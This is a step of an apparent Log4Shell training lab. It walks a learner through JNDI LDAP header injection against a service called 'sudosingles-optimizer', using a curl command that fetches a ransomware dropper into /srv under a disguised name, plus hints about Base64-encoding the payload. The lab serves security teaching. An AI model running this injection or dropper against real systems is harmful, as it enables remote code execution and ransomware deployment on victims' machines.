The malicious command we want to execute is:

curl PAYLOADDROPPERURL –output /srv/connectioncheck

Where PAYLOADDROPPERURL is the value found in FSSPayloadDropperUrl in the credential field below.

FSSPayloadDropperUrl is a special url that can be used to drop a ransomware payload. When the above command is executed in the container running sudosingles-optimizer, it will drop a nasty file in the /srv directory, disguised as something benign.

Just like before, we’ll make a request to our malicious LDAP server using curl on the attack machine. Open another Terminal Emulator window and run the following command:

curl http://sudosingles-optimizer -H ‘X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}’

Where PAYLOAD is the malicious command that we crafted above and YOURIP is the attack machine’s private IP.

However, you’ll notice that if you just try to substitute the malicious command for PAYLOAD, then run the whole request to sudosingles-optimizer above, the exploit won’t work. Something is missing…

Maybe you need to encode PAYLOAD somehow? Hm…

When you believe you’ve successfully performed the exploit, click “Verify” to check your work.
